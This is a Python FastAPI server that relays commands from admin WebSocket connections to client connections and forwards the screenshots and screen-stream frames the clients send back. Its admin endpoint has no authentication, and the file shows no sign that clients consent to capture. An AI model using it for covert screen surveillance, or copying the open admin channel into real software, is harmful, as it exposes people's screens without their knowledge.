from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from typing import Dict
import random
import json
import asyncio

app = FastAPI()

clients: Dict[str, WebSocket] = {}
admins: list[WebSocket] = []

def generate_client_id():
    """Generate a unique 4-digit ID"""
    while True:
        client_id = f"{random.randint(1000, 9999)}"
        if client_id not in clients:
            return client_id

@app.get("/")
async def root():
    return {"status": "Server is running", "clients": len(clients), "admins": len(admins)}

@app.get("/clients")
async def get_clients():
    return {"clients": list(clients.keys())}

# =========================
# CLIENT CONNECT
# =========================
@app.websocket("/ws/client")
async def client_ws(websocket: WebSocket):
    await websocket.accept()
    
    # Generate unique ID for client
    client_id = generate_client_id()
    clients[client_id] = websocket
    
    # Send ID to client
    try:
        await websocket.send_json({
            "type": "id_assigned",
            "client_id": client_id
        })
    except:
        clients.pop(client_id, None)
        return
    
    print(f"✅ Client {client_id} connected")
    
    # Notify all admins about new client
    await broadcast_client_list()
    
    try:
        while True:
            try:
                # Set timeout for receiving data
                data = await asyncio.wait_for(websocket.receive_text(), timeout=60.0)
                
                # If it's a ping, ignore
                if data == "ping":
                    continue
                
                # If client sends image -> forward to all admins
                await broadcast_to_admins({
                    "type": "screenshot",
                    "client_id": client_id,
                    "image": data
                })
                
            except asyncio.TimeoutError:
                # Send ping to check if client is alive
                try:
                    await websocket.send_text("ping")
                except:
                    break

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"⚠️ Client {client_id} error: {e}")
    finally:
        clients.pop(client_id, None)
        print(f"❌ Client {client_id} disconnected")
        await broadcast_client_list()


# =========================
# ADMIN CONNECT
# =========================
@app.websocket("/ws/admin")
async def admin_ws(websocket: WebSocket):
    await websocket.accept()
    admins.append(websocket)
    print("👤 Admin connected")
    
    # Send current client list to newly connected admin
    try:
        await websocket.send_json({
            "type": "client_list",
            "clients": list(clients.keys())
        })
    except:
        admins.remove(websocket)
        return
    
    try:
        while True:
            try:
                data = await asyncio.wait_for(websocket.receive_json(), timeout=60.0)

                # data = {"action": "take_photo", "client_id": "1234"}
                # or data = {"action": "stream_frame", "client_id": "1234", "quality": "medium"}
                if data.get("action") == "take_photo":
                    client_id = data.get("client_id")
                    if client_id in clients:
                        try:
                            await clients[client_id].send_text("take_photo")
                            print(f"📸 Screenshot requested for client {client_id}")
                        except:
                            pass
                
                elif data.get("action") == "stream_frame":
                    client_id = data.get("client_id")
                    quality = data.get("quality", "medium")
                    if client_id in clients:
                        try:
                            await clients[client_id].send_json({
                                "action": "stream_frame",
                                "quality": quality
                            })
                        except:
                            pass
                            
            except asyncio.TimeoutError:
                # Send ping to keep connection alive
                try:
                    await websocket.send_json({"type": "ping"})
                except:
                    break

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"⚠️ Admin error: {e}")
    finally:
        if websocket in admins:
            admins.remove(websocket)
        print("👤 Admin disconnected")


# =========================
# HELPER FUNCTIONS
# =========================
async def broadcast_client_list():
    """Broadcast updated client list to all admins"""
    message = {
        "type": "client_list",
        "clients": list(clients.keys())
    }
    
    disconnected_admins = []
    for admin in admins:
        try:
            await admin.send_json(message)
        except:
            disconnected_admins.append(admin)
    
    # Clean up disconnected admins
    for admin in disconnected_admins:
        if admin in admins:
            admins.remove(admin)

async def broadcast_to_admins(message):
    """Broadcast message to all admins"""
    disconnected_admins = []
    for admin in admins:
        try:
            await admin.send_json(message)
        except:
            disconnected_admins.append(admin)
    
    # Clean up disconnected admins
    for admin in disconnected_admins:
        if admin in admins:
            admins.remove(admin)
